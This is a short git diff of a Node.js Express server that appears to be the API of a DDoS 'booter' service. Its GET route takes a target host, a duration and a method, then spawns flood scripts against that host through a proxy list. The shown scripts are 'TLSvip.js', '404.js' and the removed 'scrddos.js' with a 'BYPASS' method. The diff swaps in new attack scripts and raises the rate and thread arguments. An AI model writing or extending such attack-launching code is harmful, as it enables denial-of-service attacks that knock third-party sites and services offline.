@@ -18,7 +18,7 @@ app.get('/', (req, res) => {
 
     if (method === 'TLS') {
       const spawn = require('child_process').spawn;
-      const ls = spawn('node', ['TLS.js', host, time, 64, 7, 'new.txt']);
+      const ls = spawn('node', ['TLSvip.js', host, time, 150, 100, 'proxy.txt']);
 
       ls.stdout.on('data', (data) => {
         console.log(`stdout: ${data}`);
@@ -48,9 +48,9 @@ app.get('/', (req, res) => {
           res.status(500).send('An error occurred during the execution of the process.');
         }
       });
-    } else if (method === 'BYPASS') {
+    } else if (method === '404') {
       const spawn = require('child_process').spawn;
-      const ls = spawn('node', ['scrddos.js', host, time, 64, 7, 'new.txt']);
+      const ls = spawn('node', ['404.js', host, time, 150, 100, 'proxy.txt']);
 
       ls.stdout.on('data', (data) => {
         console.log(`stdout: ${data}`);
